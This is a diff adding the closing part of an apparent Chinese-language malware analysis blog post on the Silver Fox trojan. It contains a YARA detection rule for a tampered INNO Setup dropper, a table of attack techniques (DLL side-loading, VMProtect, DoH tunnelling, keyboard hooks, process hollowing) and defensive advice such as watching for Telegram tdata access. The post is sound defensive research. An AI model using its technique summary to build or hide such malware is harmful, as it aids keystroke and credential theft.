+<span class="w">    </span><span class="k">meta</span><span class="p">:</span>
+<span class="w">        </span><span class="n">description</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;检测被篡改的 INNO Setup 银狐投放器&quot;</span>
+<span class="w">        </span><span class="n">author</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;Security Research Lab&quot;</span>
+
+<span class="w">    </span><span class="k">strings</span><span class="p">:</span>
+<span class="w">        </span><span class="c1">// INNO Setup 标识</span>
+<span class="w">        </span><span class="nv">$inno</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;Inno Setup&quot;</span><span class="w"> </span><span class="nb">ascii</span>
+<span class="w">        </span><span class="nv">$innoclass</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;TForm&quot;</span><span class="w"> </span><span class="nb">ascii</span>
+
+<span class="w">        </span><span class="c1">// 恶意释放行为</span>
+<span class="w">        </span><span class="nv">$release_dll</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;wjcapture.dll&quot;</span><span class="w"> </span><span class="nb">ascii</span>
+<span class="w">        </span><span class="nv">$update_xml</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;Update.xml&quot;</span><span class="w"> </span><span class="nb">ascii</span>
+
+<span class="w">    </span><span class="k">condition</span><span class="p">:</span>
+<span class="w">        </span><span class="nb">uint16</span><span class="p">(</span>0<span class="p">)</span><span class="w"> </span><span class="p">==</span><span class="w"> </span>0<span class="n">x5A4D</span><span class="w"> </span><span class="ow">and</span>
+<span class="w">        </span><span class="nv">$inno</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="nv">$release_dll</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="nv">$update_xml</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<hr />
+<h2>八、总结与防御建议</h2>
+<h3>8.1 攻击技术总结</h3>
+<p>本次分析的银狐木马样本展示了多层纵深攻击技术栈：</p>
+<table>
+<thead>
+<tr>
+<th>层级</th>
+<th>技术</th>
+<th>目的</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>投放层</td>
+<td>INNO Setup 篡改</td>
+<td>伪装合法软件安装包</td>
+</tr>
+<tr>
+<td>加载层</td>
+<td>白加黑 DLL 劫持</td>
+<td>利用合法程序加载恶意代码</td>
+</tr>
+<tr>
+<td>反分析层</td>
+<td>7 类垃圾指令 + VMProtect</td>
+<td>阻碍静态和动态分析</td>
+</tr>
+<tr>
+<td>加密层</td>
+<td>XOR 种子循环 + RC4 分块变体</td>
+<td>保护载荷和传输数据</td>
+</tr>
+<tr>
+<td>通信层</td>
+<td>DoH (HTTPS 隧道)</td>
+<td>绕过 DNS 监控和流量过滤</td>
+</tr>
+<tr>
+<td>持久化层</td>
+<td>全局键盘钩子 + 进程镂空</td>
+<td>长期驻留和数据窃取</td>
+</tr>
+</tbody>
+</table>
+<h3>8.2 防御建议</h3>
+<ol>
+<li>
+<p><strong>DoH 流量监控：</strong> 部署支持 DoH 检测的网络设备，监控 <code>/dns-query</code> 路径模式的 HTTPS 请求，特别是向公共 DoH 服务器（223.5.5.5、8.8.8.8）发起的异常大量请求。</p>
+</li>
+<li>
+<p><strong>DLL 劫持防护：</strong> 启用 Windows 的 CWDIllegalInDllSearch 注册表项，阻止从当前工作目录加载 DLL：
+   <code>HKLM\System\CurrentControlSet\Control\Session Manager
+   CWDIllegalInDllSearch = 0xFFFFFFFF</code></p>
+</li>
+<li>
+<p><strong>端点行为检测：</strong> 监控 <code>SetWindowsHookExA(WH_KEYBOARD_LL, ...)</code> 的全局键盘钩子安装行为，以及对 Telegram <code>tdata</code> 目录的异常访问。</p>
+</li>
+<li>
+<p><strong>INNO Setup 文件审计：</strong> 对来自非官方渠道的 INNO Setup 安装程序进行 <code>[Code]</code> 段的静态分析，检查是否存在可疑的文件释放和进程执行操作。</p>
+</li>
+<li>
+<p><strong>VMProtect 检测：</strong> 部署基于 VMProtect 特征的静态检测工具，标记包含 VMProtect 虚拟化保护的未知 DLL 文件。</p>
+</li>
+</ol>
+<hr />
+<p><em>本文所有技术分析均基于捕获的真实恶意样本，IOC 信息可直接用于威胁情报平台和安全设备的检测规则部署。</em></p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
